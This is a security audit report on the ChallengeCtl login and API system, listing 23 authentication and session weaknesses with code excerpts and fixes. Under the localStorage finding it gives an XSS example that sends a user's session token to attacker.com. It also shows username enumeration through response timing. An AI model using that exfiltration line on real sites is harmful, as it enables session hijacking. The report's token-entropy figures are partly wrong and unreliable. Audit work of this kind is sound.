# ChallengeCtl Security Analysis Report

**Date:** 2025-11-16
**Scope:** API Authentication & User Login System
**Analyst:** Security Review

## Executive Summary

This comprehensive security analysis of the ChallengeCtl API and authentication system has identified **23 security vulnerabilities and weaknesses** across critical, high, medium, and low severity categories. The system implements username/password authentication with TOTP-based 2FA, session-based authorization, and separate API key authentication for runners. While the foundation is solid with bcrypt password hashing and TOTP 2FA, there are significant gaps in brute force protection, session management, and defense-in-depth controls.

**Risk Level: HIGH**

---

## Table of Contents

1. [Critical Vulnerabilities](#critical-vulnerabilities)
2. [High Severity Issues](#high-severity-issues)
3. [Medium Severity Issues](#medium-severity-issues)
4. [Low Severity Issues](#low-severity-issues)
5. [Security Strengths](#security-strengths)
6. [Detailed Recommendations](#detailed-recommendations)
7. [Implementation Priorities](#implementation-priorities)

---

## Critical Vulnerabilities

### 1. ⚠️ **No Rate Limiting on Authentication Endpoints**

**Location:** `server/api.py:266-396`

**Issue:** The `/api/auth/login` and `/api/auth/verify-totp` endpoints have no rate limiting, allowing unlimited authentication attempts.

**Impact:**
- Brute force attacks on user passwords
- TOTP code enumeration (000000-999999 = only 1 million combinations)
- Account enumeration via timing differences
- Denial of service via resource exhaustion

**Evidence:**
```python
@self.app.route('/api/auth/login', methods=['POST'])
def login():
    # No rate limiting decorator or logic
    data = request.json
    # ... authentication logic
```

**Exploitation Scenario:**
1. Attacker scripts automated login attempts
2. Tests common passwords against known usernames
3. If TOTP is required, can attempt all 1 million codes within the 30-second window
4. No lockout or throttling prevents this attack

**Recommendation:**
- Implement rate limiting: 5 failed attempts per IP per 15 minutes
- Add account lockout after 10 failed attempts in 1 hour
- Implement exponential backoff (increase delay after each failure)
- Consider CAPTCHA after 3 failed attempts

---

### 2. ⚠️ **Session Tokens Not Invalidated on Critical Actions**

**Location:** `server/api.py:409-456` (password change), `server/api.py:605-646` (admin password reset)

**Issue:** When a user changes their password or an admin resets a password, existing sessions remain valid. This violates the principle of least privilege.

**Impact:**
- Compromised sessions remain valid after password change
- Attacker maintains access even after password reset
- No forced re-authentication after security-critical actions

**Evidence:**
```python
@self.app.route('/api/auth/change-password', methods=['POST'])
@self.require_admin_auth
def change_own_password():
    # ... password change logic
    if not self.db.change_password(username, new_password_hash):
        return jsonify({'error': 'Failed to update password'}), 500

    # ❌ No session invalidation!
    return jsonify({'status': 'password changed'}), 200
```

**Recommendation:**
- Invalidate all sessions except the current one on password change
- Force logout on admin-initiated password reset
- Implement a session version/generation number that increments on security changes

---

### 3. ⚠️ **CORS Configured to Allow All Origins**

**Location:** `server/api.py:76-77`

**Issue:** CORS is configured with wildcard `*` origin, allowing any website to make authenticated requests to the API.

**Impact:**
- Cross-site request forgery (CSRF) attacks possible
- Malicious websites can make API calls on behalf of authenticated users
- Session tokens can be extracted by malicious sites

**Evidence:**
```python
# Enable CORS for development
CORS(self.app)  # ❌ Allows all origins by default

# WebSocket CORS
self.socketio = SocketIO(self.app, cors_allowed_origins="*")  # ❌ Wildcard
```

**Recommendation:**
- Configure explicit allowed origins: `CORS(app, origins=['https://challengectl.example.com'])`
- Remove wildcard CORS in production
- Implement proper CSRF tokens for state-changing operations

---

### 4. ⚠️ **Timing Attack Vulnerability in Password Verification**

**Location:** `server/api.py:289-296`

**Issue:** Error messages and response times differ between "user not found" and "invalid password", enabling username enumeration.

**Impact:**
- Attackers can enumerate valid usernames
- Reduces brute force search space from username+password to just password
- Violates security best practice of constant-time comparisons

**Evidence:**
```python
user = self.db.get_user(username)
if not user:
    return jsonify({'error': 'Invalid credentials'}), 401  # ⏱️ Fast response

# Verify password
if not bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8')):
    return jsonify({'error': 'Invalid credentials'}), 401  # ⏱️ Slower (bcrypt)
```

**Exploitation:**
```bash
# Fast response (user doesn't exist)
time: 5ms -> user "alice" does not exist

# Slow response (user exists, wrong password)
time: 250ms -> user "bob" exists (bcrypt hashing delay)
```

**Recommendation:**
- Always call bcrypt.checkpw() even for non-existent users with a dummy hash
- Ensure constant response time for all authentication failures
- Use generic error messages

---

### 5. ⚠️ **In-Memory Session Storage (No Persistence)**

**Location:** `server/api.py:99-102`

**Issue:** Sessions are stored in memory only, causing all users to be logged out on server restart. Not suitable for production.

**Impact:**
- All sessions lost on server restart/crash
- No horizontal scaling possible (load balancing won't work)
- Session fixation risk (sessions never truly expire on disk)
- No audit trail of active sessions

**Evidence:**
```python
# In-memory sessions with thread-safe locking
# Format: {session_token: {'username': str, 'expires': datetime, 'totp_verified': bool}}
self.sessions = {}  # ❌ Lost on restart
self.sessions_lock = threading.Lock()
```

**Recommendation:**
- Migrate to Redis or database-backed sessions
- Implement session persistence
- Add session metadata: IP address, user agent, created_at, last_activity
- Enable session revocation and audit logging

---

## High Severity Issues

### 6. 🔴 **No Account Lockout Mechanism**

**Location:** `server/api.py:266-330`

**Issue:** Failed login attempts are not tracked, no temporary account lockout implemented.

**Impact:**
- Unlimited password guessing attempts
- No protection against persistent brute force
- Account compromise via automated attacks

**Recommendation:**
- Track failed attempts per username in database
- Lock account for 30 minutes after 10 failed attempts
- Send email notification on account lockout
- Require CAPTCHA or admin unlock for locked accounts

---

### 7. 🔴 **Session Tokens Stored in localStorage (XSS Risk)**

**Location:** `frontend/src/auth.js:5-14`

**Issue:** Session tokens stored in localStorage are vulnerable to XSS attacks. Any JavaScript execution can steal tokens.

**Impact:**
- XSS vulnerability leads to complete session hijacking
- Tokens persist across browser restarts (can't be cleared easily)
- No HttpOnly protection (accessible to JavaScript)

**Evidence:**
```javascript
const apiKey = ref(localStorage.getItem('apiKey') || null)

export function login(key) {
  apiKey.value = key
  localStorage.setItem('apiKey', key)  // ❌ XSS vulnerable
}
```

**Attack Scenario:**
```javascript
// If attacker injects this via XSS:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('apiKey'))
```

**Recommendation:**
- Use HttpOnly cookies instead of localStorage
- Implement proper CSRF protection with cookies
- Add Content-Security-Policy headers to prevent XSS
- Consider using BFF (Backend-for-Frontend) pattern

---

### 8. 🔴 **No CSRF Protection on State-Changing Endpoints**

**Location:** All POST/PUT/DELETE endpoints in `server/api.py`

**Issue:** No CSRF tokens required for state-changing operations. Combined with CORS misconfiguration, this is dangerous.

**Impact:**
- Attackers can craft malicious websites that perform actions as authenticated users
- Can trigger password changes, user creation, challenge modifications
- Session hijacking via cross-site requests

**Recommendation:**
- Implement CSRF token validation for all POST/PUT/DELETE requests
- Use Double Submit Cookie or Synchronizer Token pattern
- Validate Origin/Referer headers
- Consider SameSite cookie attribute

---

### 9. 🔴 **Static API Keys with No Rotation**

**Location:** `server/api.py:88`, runner authentication

**Issue:** Runner API keys are static, stored in config file, never rotated, and have no expiration.

**Impact:**
- Compromised API key grants permanent access
- No way to detect or revoke compromised keys
- Keys stored in plain text in config file
- No audit trail of API key usage

**Evidence:**
```python
self.api_keys = self.config.get('server', {}).get('api_keys', {})

# API keys never expire, never rotate
def require_api_key(self, f):
    for rid, key in self.api_keys.items():
        if key == api_key:  # ❌ Static comparison
            runner_id = rid
            break
```

**Recommendation:**
- Implement API key rotation (e.g., 90-day expiration)
- Store hashed API keys in database, not plain text
- Add key generation timestamp and last-used tracking
- Implement key revocation capability
- Consider using short-lived JWT tokens instead

---

### 10. 🔴 **Default Admin Account During Initial Setup**

**Location:** `server/database.py:144-188`

**Issue:** Default admin account created with random password displayed in logs. If logs are exposed or retained, this is a security risk.

**Impact:**
- Default credentials may be captured in log aggregation systems
- Password visible in terminal scrollback
- If initial setup not completed, default account remains active
- No forced password change on first login

**Evidence:**
```python
logger.warning(f"Password: {default_password}")  # ❌ Logged in plain text
print(f"Password: {default_password}", flush=True)  # ❌ Displayed in terminal
```

**Recommendation:**
- Never log passwords, even temporary ones
- Display password only once in terminal with clear warning
- Force immediate password change on first login
- Auto-disable default account after timeout (24 hours)
- Send password via secure out-of-band channel

---

### 11. 🔴 **No Session Activity Timeout**

**Location:** `server/api.py:213-225`

**Issue:** Sessions expire after 24 hours from creation, but not based on last activity. Inactive sessions remain valid.

**Impact:**
- Compromised session remains valid even if user is inactive
- No protection against session theft
- Violates principle of least privilege

**Evidence:**
```python
def create_session(self, username: str, totp_verified: bool = False) -> str:
    session_token = secrets.token_urlsafe(32)
    expires = datetime.now() + timedelta(hours=24)  # ❌ No activity-based timeout
```

**Recommendation:**
- Implement sliding session timeout (15 minutes of inactivity)
- Update `last_activity` timestamp on each authenticated request
- Invalidate sessions after 15 minutes of inactivity
- Keep maximum session lifetime at 24 hours

---

### 12. 🔴 **No WebSocket Authentication Validation**

**Location:** `server/api.py:1238-1254`

**Issue:** WebSocket connections are established without explicit authentication validation in the connect handler.

**Impact:**
- Unauthenticated users might receive real-time updates
- Potential information disclosure
- WebSocket connection hijacking

**Evidence:**
```python
@self.socketio.on('connect')
def handle_connect():
    logger.info(f"WebSocket client connected: {request.sid}")
    # ❌ No authentication check!
    stats = self.db.get_dashboard_stats()
    emit('initial_state', {...})
```

**Recommendation:**
- Validate session token on WebSocket connect
- Disconnect unauthenticated clients
- Implement room-based access control
- Add authentication to all WebSocket event handlers

---

## Medium Severity Issues

### 13. 🟡 **Weak Password Policy**

**Location:** `server/api.py:424-425`, `server/api.py:481-482`

**Issue:** Password requirements are minimal (8 characters only, no complexity requirements).

**Impact:**
- Users can set weak passwords like "password" or "12345678"
- Increased vulnerability to dictionary attacks
- Lower security posture

**Recommendation:**
```python
def validate_password(password: str) -> tuple[bool, str]:
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    if not re.search(r'[^A-Za-z0-9]', password):
        return False, "Password must contain special character"
    return True, "Password valid"
```

---

### 14. 🟡 **TOTP Valid Window of 1 (Replay Window)**

**Location:** `server/api.py:373`

**Issue:** TOTP verification uses `valid_window=1`, allowing codes from previous and next 30-second windows.

**Impact:**
- 90-second window for code validity (extends attack time)
- Potential for replay attacks if code is intercepted
- Reduces TOTP security effectiveness

**Evidence:**
```python
totp = pyotp.TOTP(totp_secret)
if not totp.verify(totp_code, valid_window=1):  # ⚠️ 90-second window
```

**Recommendation:**
- Reduce to `valid_window=0` for strict 30-second enforcement
- Store used TOTP codes in cache to prevent replay
- Implement TOTP code single-use enforcement
- Consider requiring fresh code on critical actions

---

### 15. 🟡 **No Logging of Authentication Failures**

**Location:** `server/api.py:266-396`

**Issue:** Failed login attempts are not logged or tracked for security monitoring.

**Impact:**
- No visibility into brute force attacks
- Cannot detect compromised accounts
- No audit trail for security incidents
- Impossible to perform forensic analysis

**Recommendation:**
```python
def log_auth_failure(username, ip_address, reason, totp_attempt=False):
    logger.warning(
        f"Authentication failure: username={username}, "
        f"ip={ip_address}, reason={reason}, totp={totp_attempt}"
    )
    # Store in database for analysis
    db.log_auth_event(
        event_type='auth_failure',
        username=username,
        ip_address=ip_address,
        reason=reason,
        timestamp=datetime.now()
    )
```

---

### 16. 🟡 **Frontend Route Guards Only Check Token Presence**

**Location:** `frontend/src/router.js:78-90`

**Issue:** Router navigation guards only check if a token exists in localStorage, not if it's valid.

**Impact:**
- Expired or invalid tokens allow access to protected routes
- UI shows protected pages before API rejects requests
- Poor user experience and potential information disclosure

**Evidence:**
```javascript
router.beforeEach((to, from, next) => {
  const requiresAuth = to.matched.some(record => record.meta.requiresAuth)

  if (requiresAuth && !checkAuth()) {  // ❌ Only checks token existence
    next('/login')
  } else {
    next()  // ❌ Doesn't validate token with backend
  }
})
```

**Recommendation:**
- Validate token with backend before allowing access
- Implement token refresh mechanism
- Add token expiration tracking in frontend
- Redirect to login on 401 responses (already implemented in api.js)

---

### 17. 🟡 **No IP-Based Anomaly Detection**

**Issue:** No tracking of login patterns, IP addresses, or geographic locations.

**Impact:**
- Cannot detect account takeover from unusual locations
- No alert on suspicious login patterns
- No protection against distributed brute force attacks

**Recommendation:**
- Store IP address and user agent with each session
- Alert users on login from new IP/location
- Implement geolocation-based risk scoring
- Track failed attempts per IP across all accounts

---

### 18. 🟡 **Missing Content Security Policy (CSP)**

**Location:** Nginx configuration and Flask responses

**Issue:** No Content-Security-Policy headers implemented to prevent XSS.

**Impact:**
- Higher risk of XSS exploitation
- No defense-in-depth against script injection
- Inline scripts can be executed by attackers

**Recommendation:**
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss://challengectl.example.com" always;
```

---

### 19. 🟡 **Session Token Generation Could Be Stronger**

**Location:** `server/api.py:215`

**Issue:** Using `secrets.token_urlsafe(32)` generates 32 URL-safe characters (~192 bits entropy), which is good but could be better.

**Impact:**
- Theoretical brute force possible (though highly impractical)
- Industry best practice recommends 256+ bits

**Recommendation:**
```python
session_token = secrets.token_urlsafe(43)  # 256 bits of entropy
# or
session_token = secrets.token_hex(32)  # 256 bits, 64 hex chars
```

---

## Low Severity Issues

### 20. 🟢 **Misleading Variable Naming (apiKey vs session_token)**

**Location:** `frontend/src/auth.js:5`

**Issue:** Frontend uses "apiKey" to store session tokens, which is confusing since API keys are separate (for runners).

**Impact:**
- Code maintainability issues
- Confusion for developers
- Potential for bugs

**Recommendation:**
```javascript
const sessionToken = ref(localStorage.getItem('sessionToken') || null)
// Rename throughout codebase for clarity
```

---

### 21. 🟢 **No Multi-Device Session Management**

**Issue:** Users cannot see or revoke active sessions from other devices.

**Impact:**
- Cannot revoke compromised sessions
- No visibility into account access
- Difficult to detect unauthorized access

**Recommendation:**
- Add session management UI
- Display active sessions with device info, IP, last activity
- Allow users to revoke individual sessions
- Implement "logout all devices" functionality

---

### 22. 🟢 **Overly Permissive Development CORS**

**Location:** `server/api.py:76-77`

**Issue:** Comment says "for development" but no environment check.

**Impact:**
- CORS likely enabled in production
- Developer might forget to disable
- Security misconfiguration risk

**Recommendation:**
```python
if os.getenv('FLASK_ENV') == 'development':
    CORS(self.app)
else:
    CORS(self.app, origins=os.getenv('ALLOWED_ORIGINS', '').split(','))
```

---

### 23. 🟢 **No Password History to Prevent Reuse**

**Issue:** Users can change password back to a previously used password.

**Impact:**
- Reduced security if old password was compromised
- Users might rotate between 2-3 passwords

**Recommendation:**
- Store hash of last 5 passwords
- Prevent reuse of previous passwords
- Add password history table

---

## Security Strengths

The system does implement several security best practices:

✅ **Bcrypt password hashing** with automatic salt generation
✅ **TOTP-based 2FA** using industry-standard pyotp library
✅ **Parameterized SQL queries** preventing SQL injection
✅ **Separate authentication** for runners (API keys) and admins (sessions)
✅ **Session expiration** (24 hours)
✅ **Password verification** required before password change
✅ **Account enabled/disabled** flag support
✅ **TLS 1.2/1.3** enforcement in nginx configuration
✅ **Security headers** in nginx (HSTS, X-Frame-Options, etc.)
✅ **Cryptographically secure** random token generation
✅ **Thread-safe** session management
✅ **Password change requirement** flag for forced resets
✅ **Automatic cleanup** of expired sessions

---

## Detailed Recommendations

### Immediate Actions (Within 1 Week)

1. **Implement Rate Limiting**
   - Use Flask-Limiter: `@limiter.limit("5 per minute")` on auth endpoints
   - Add IP-based throttling

2. **Fix CORS Configuration**
   ```python
   CORS(self.app, origins=['https://challengectl.example.com'])
   self.socketio = SocketIO(self.app, cors_allowed_origins=['https://challengectl.example.com'])
   ```

3. **Invalidate Sessions on Password Change**
   ```python
   def change_password(username, new_hash):
       # Invalidate all sessions for this user
       with self.sessions_lock:
           to_delete = [token for token, session in self.sessions.items()
                       if session['username'] == username and token != current_token]
           for token in to_delete:
               del self.sessions[token]
   ```

4. **Add Authentication Logging**
   - Log all login attempts (success/failure)
   - Include IP, username, timestamp, reason

5. **Implement Constant-Time Username Validation**
   ```python
   # Always call bcrypt even for non-existent users
   dummy_hash = '$2b$12$dummyhashvaluehere...'
   if not user:
       bcrypt.checkpw(password.encode('utf-8'), dummy_hash.encode('utf-8'))
       return jsonify({'error': 'Invalid credentials'}), 401
   ```

### Short-Term (Within 1 Month)

6. **Migrate to Persistent Session Storage**
   - Use Redis for session storage
   - Implement session metadata tracking

7. **Add Account Lockout**
   - Create failed_attempts table
   - Lock after 10 failed attempts for 30 minutes

8. **Strengthen Password Policy**
   - Minimum 12 characters
   - Require uppercase, lowercase, number, special char
   - Implement zxcvbn password strength meter

9. **Implement CSRF Protection**
   - Use Flask-WTF or custom CSRF token implementation
   - Validate tokens on all state-changing requests

10. **Add WebSocket Authentication**
    ```python
    @self.socketio.on('connect')
    def handle_connect():
        token = request.args.get('token')
        if not validate_session_token(token):
            return False  # Reject connection
    ```

### Medium-Term (Within 3 Months)

11. **Move Session Tokens from localStorage to HttpOnly Cookies**
    - Implement cookie-based authentication
    - Add SameSite=Strict attribute
    - Implement proper CSRF protection

12. **Implement API Key Rotation**
    - Add expiration dates to API keys
    - Implement key generation/revocation API
    - Store hashed keys in database

13. **Add Session Management UI**
    - Show active sessions
    - Allow session revocation
    - Display login history

14. **Implement Comprehensive Audit Logging**
    - Log all authentication events
    - Log all administrative actions
    - Implement log rotation and retention

15. **Add Security Monitoring & Alerting**
    - Monitor for brute force attempts
    - Alert on suspicious patterns
    - Implement anomaly detection

### Long-Term (Within 6 Months)

16. **Consider OAuth 2.0 / OIDC Implementation**
    - Support SSO integration
    - Add social login options
    - Implement proper token refresh

17. **Implement Security Information and Event Management (SIEM)**
    - Centralized log aggregation
    - Real-time threat detection
    - Automated incident response

18. **Add Penetration Testing**
    - Regular security audits
    - Third-party penetration testing
    - Bug bounty program

19. **Implement Hardware Security Key Support**
    - Add WebAuthn/FIDO2 support
    - Phishing-resistant 2FA

20. **Security Hardening**
    - Implement secrets management (HashiCorp Vault)
    - Add database encryption at rest
    - Implement certificate pinning for runners

---

## Implementation Priorities

### Priority 1 (Critical - Implement Immediately)
- Rate limiting on authentication endpoints
- Fix CORS configuration
- Session invalidation on password change
- Authentication failure logging
- Constant-time password validation

### Priority 2 (High - Implement Within 1 Month)
- Migrate to Redis-backed sessions
- Account lockout mechanism
- CSRF protection
- Strengthen password policy
- WebSocket authentication

### Priority 3 (Medium - Implement Within 3 Months)
- Move to HttpOnly cookies
- API key rotation
- Session management UI
- Audit logging
- Security monitoring

### Priority 4 (Low - Nice to Have)
- Variable naming cleanup
- Multi-device session management
- Password history
- Enhanced security headers

---

## Testing & Validation

After implementing fixes, validate with:

1. **Automated Security Scanning**
   - OWASP ZAP
   - Burp Suite
   - SQLMap (SQL injection)
   - XSStrike (XSS detection)

2. **Manual Penetration Testing**
   - Brute force testing
   - Session hijacking attempts
   - CSRF exploitation
   - Authentication bypass attempts

3. **Code Review**
   - Security-focused peer review
   - Static analysis (Bandit for Python)
   - Dependency vulnerability scanning (Safety, Snyk)

4. **Compliance Validation**
   - OWASP Top 10 checklist
   - CWE Top 25 review
   - NIST Cybersecurity Framework alignment

---

## Conclusion

The ChallengeCtl authentication system has a solid foundation with bcrypt and TOTP 2FA, but requires significant hardening to be production-ready. The most critical issues are the lack of rate limiting and CORS misconfiguration, which should be addressed immediately. Implementing the recommendations in this report will significantly improve the security posture and make the system resilient against common attacks.

**Estimated Implementation Time:**
- Priority 1 (Critical): 1-2 weeks
- Priority 2 (High): 3-4 weeks
- Priority 3 (Medium): 8-12 weeks
- Total Effort: ~3-4 months of dedicated security engineering

**Risk After Remediation:** LOW to MEDIUM (depending on deployment environment)

---

**Report prepared by:** Security Analysis Team
**Review date:** 2025-11-16
**Next review:** After Priority 1 & 2 implementations
